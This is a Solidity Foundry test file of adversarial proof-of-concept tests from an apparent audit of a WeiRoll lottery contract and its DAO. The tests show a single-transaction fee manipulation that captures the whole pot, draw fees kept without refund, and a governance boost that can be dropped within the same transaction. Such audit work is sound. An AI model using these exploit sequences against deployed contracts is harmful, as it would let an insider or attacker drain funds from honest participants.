// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, Vm} from "@forge/Test.sol";
import {NameNFT} from "../src/NameNFT.sol";
import {WeiDAO} from "../src/WeiDAO.sol";
import {WeiRoll} from "../src/WeiRoll.sol";

contract MockWrapper {
    uint256 public price = 0.0001 ether;
    uint256 public nextId = 1;
    bool public quotes = true;

    function setQuotes(bool q) external { quotes = q; }

    function calculateRequestPriceNative(uint32, uint32) external view returns (uint256) {
        require(quotes, "stale feed");
        return price;
    }

    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata)
        external payable returns (uint256) { return nextId++; }

    function fulfill(address consumer, uint256 id, uint256 word) external {
        uint256[] memory w = new uint256[](1); w[0] = word;
        WeiRoll(payable(consumer)).rawFulfillRandomWords(id, w);
    }
}

contract MockStETH {
    uint256 public totalShares;
    uint256 public totalPooled;
    mapping(address => uint256) public sharesOf;

    function submit(address) public payable returns (uint256 shares) {
        require(msg.value != 0, "ZERO_DEPOSIT");
        shares = totalPooled == 0 ? msg.value : msg.value * totalShares / totalPooled;
        totalShares += shares; totalPooled += msg.value; sharesOf[msg.sender] += shares;
    }
    receive() external payable { submit(address(0)); }
    function getPooledEthByShares(uint256 s) public view returns (uint256) {
        return totalShares == 0 ? s : s * totalPooled / totalShares;
    }
    function transferShares(address to, uint256 s) external returns (uint256) {
        sharesOf[msg.sender] -= s; sharesOf[to] += s; return getPooledEthByShares(s);
    }
}

/// @dev Adversarial PoCs against WeiRoll. Each test is a claim; the asserts are the proof.
contract WeiRollAdversarialTest is Test {
    NameNFT nft;
    WeiDAO dao;
    WeiRoll roll;
    MockWrapper wrapper;
    MockStETH steth;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address attacker = address(0xBAD);
    address execAddr = address(0xE7EC);

    uint256 tAlice; uint256 tBob; uint256 tAtk; uint256 tDao; uint256 tRoll;
    uint256 constant ALPHA = 999_998_853_923_940_000;

    receive() external payable {}

    function setUp() public {
        nft = new NameNFT();
        dao = new WeiDAO(address(nft), ALPHA, 0.05 ether * 1e18 / (1e18 - ALPHA) / 2, 0, 0, address(0));
        wrapper = new MockWrapper();
        steth = new MockStETH();
        roll = new WeiRoll(address(nft), address(dao), address(wrapper), address(steth));

        uint256[] memory lens = new uint256[](2);
        uint256[] memory fees = new uint256[](2);
        lens[0] = 2; fees[0] = 0.05 ether;
        lens[1] = 5; fees[1] = 0.02 ether;
        vm.prank(nft.owner());
        nft.setLengthFees(lens, fees);

        tAlice = _register("ab", alice);
        tBob = _register("bobby", bob);
        tAtk = _register("zz", attacker); // len 2, same schedule as alice

        address z = makeAddr("z0r0z");
        tDao = _register("dao", z);
        vm.startPrank(z);
        nft.registerSubdomainFor("exec", tDao, execAddr);
        nft.transferFrom(z, address(dao), tDao);
        vm.stopPrank();

        tRoll = _register("roll", z);
        vm.prank(z);
        nft.transferFrom(z, address(roll), tRoll);

        // Mirror mainnet: NameNFT is owned by WeiDAO, so the exec role reaches setLengthFees.
        vm.prank(nft.owner());
        nft.transferOwnership(address(dao));

        vm.deal(address(this), 10 ether);
        (bool ok,) = address(roll).call{value: 10 ether}("");
        assertTrue(ok);
    }

    function _register(string memory label, address to) internal returns (uint256 id) {
        bytes32 secret = keccak256(bytes(label));
        vm.startPrank(to);
        nft.commit(nft.makeCommitment(label, to, secret));
        vm.warp(block.timestamp + 61);
        uint256 fee = nft.getFee(bytes(label).length);
        vm.deal(to, fee);
        id = nft.reveal{value: fee}(label, secret);
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
      F-1: the exec role can capture the whole pot in one transaction.

      weightOf() reads NameNFT's LIVE fee schedule against an already-paid
      term. WeiDAO owns NameNFT and its `exec.dao.wei` holder can make an
      arbitrary owner call with no proposal and no delay. So exec can raise a
      length fee, enter, and restore the fee in a single tx: its ticket keeps
      the inflated weight (entry snapshots it), every honest ticket keeps the
      old one.
    //////////////////////////////////////////////////////////////*/
    function testExecRoleCanBuyArbitraryOddsInOneTx() public {
        vm.prank(alice); roll.enter(tAlice, 0);
        vm.prank(bob); roll.enter(tBob, 0);
        uint256 honest = roll.totalWeight(0);

        uint256 feeBefore = nft.getFee(2);
        uint256 fairWeight = roll.weightOf(tAtk);

        // --- one transaction, no vote, no timelock ---
        vm.startPrank(execAddr);
        uint256[] memory lens = new uint256[](1);
        uint256[] memory fees = new uint256[](1);
        lens[0] = 2; fees[0] = 500 ether; // 10_000x
        dao.rescue(address(nft), 0, abi.encodeCall(NameNFT.setLengthFees, (lens, fees)));
        vm.stopPrank();

        vm.prank(attacker); roll.enter(tAtk, 0);

        vm.startPrank(execAddr);
        fees[0] = feeBefore; // put it back; the ticket is already frozen
        dao.rescue(address(nft), 0, abi.encodeCall(NameNFT.setLengthFees, (lens, fees)));
        vm.stopPrank();

        uint256 got = roll.weightIn(0, tAtk);
        assertEq(nft.getFee(2), feeBefore, "fee schedule restored, no lasting trace");
        assertGt(got, fairWeight * 9000, "ticket carries the inflated weight");
        assertGt(got, honest * 1000, "attacker dwarfs the whole honest field");

        // The attacker wins for any seed but the vanishing tail.
        vm.warp(roll.roundEnd());
        vm.deal(address(this), 1 ether);
        roll.draw{value: 0.0001 ether}();
        wrapper.fulfill(address(roll), roll.requestId(), uint256(keccak256("seed")));
        assertEq(roll.winnerOf(0), tAtk, "pot captured");

        vm.prank(attacker); roll.claim(0);
        assertGt(steth.sharesOf(attacker), 9 ether, "attacker holds the whole pot");
        // Total cost: the 0.05 ETH registration + gas. Pot taken: 10 ETH.
    }

    /// @dev The same lever without exec: a passed proposal reaches setLengthFees too. Shown here
    ///      as the pure mechanism — inflating a fee re-prices only tickets entered afterwards.
    function testAFeeRiseRepricesOnlyLaterEntrants() public {
        vm.prank(alice); roll.enter(tAlice, 0);
        uint256 aliceW = roll.weightIn(0, tAlice);

        uint256[] memory lens = new uint256[](1);
        uint256[] memory fees = new uint256[](1);
        lens[0] = 2; fees[0] = 5 ether; // 100x
        vm.prank(nft.owner());
        nft.setLengthFees(lens, fees);

        vm.prank(attacker); roll.enter(tAtk, 0);

        assertEq(roll.weightIn(0, tAlice), aliceW, "earlier ticket frozen at the old fee");
        assertApproxEqRel(roll.weightIn(0, tAtk), aliceW * 100, 0.01e18, "later ticket at 100x");
    }

    /*//////////////////////////////////////////////////////////////
      F-2: draw()'s abandon branch keeps msg.value with no refund and no
      Funded event, so the caller's VRF fee is silently absorbed into the pot.
    //////////////////////////////////////////////////////////////*/
    function testAbandonBranchSilentlyConfiscatesTheDrawFee() public {
        vm.prank(alice); roll.enter(tAlice, 0);
        vm.prank(bob); roll.enter(tBob, 0);
        vm.warp(roll.roundEnd());

        // The wrapper's feed goes stale between the caller's quote and their tx landing.
        wrapper.setQuotes(false);
        assertFalse(roll.drawSettles());

        address caller = address(0xCA11);
        vm.deal(caller, 1 ether);
        uint256 potBefore = roll.pot();

        vm.recordLogs();
        vm.prank(caller);
        roll.draw{value: 0.5 ether}(); // takes the abandon branch

        assertEq(caller.balance, 0.5 ether, "no refund: half the caller's ETH is gone");
        assertEq(address(roll).balance, 0.5 ether, "it sits as raw ETH, outside the share-denominated pot");
        assertEq(roll.pot(), potBefore, "pot() cannot see it");

        // No Funded event was emitted for it, so an indexer summing Funded never reconciles.
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            assertTrue(logs[i].topics[0] != WeiRoll.Funded.selector, "no Funded event");
        }

        // Anyone can sweep it in later — crediting it to whoever calls stake().
        roll.stake();
        assertGt(roll.pot(), potBefore, "only stake() rescues it");
    }

    /*//////////////////////////////////////////////////////////////
      F-3: the boost is free and can be released in the same transaction, so
      BOOST_BPS measures "did you call support() first", not governance.
    //////////////////////////////////////////////////////////////*/
    function testBoostCanBeSupportedAndDroppedInOneTx() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        nft.setPrimaryName(tAtk);
        uint256 pid = dao.propose(address(0xdead), 0, "", "self-serve boost");
        dao.support(pid, tAtk);
        roll.enter(tAtk, pid);
        dao.unsupport(pid, tAtk); // same tx; nothing re-checks it
        vm.stopPrank();

        assertEq(dao.supportOf(pid, tAtk), 0, "support already withdrawn");
        assertApproxEqRel(
            roll.weightIn(0, tAtk), roll.weightOf(tAtk) * 2, 0.01e18, "ticket still carries the 2x"
        );
    }
}
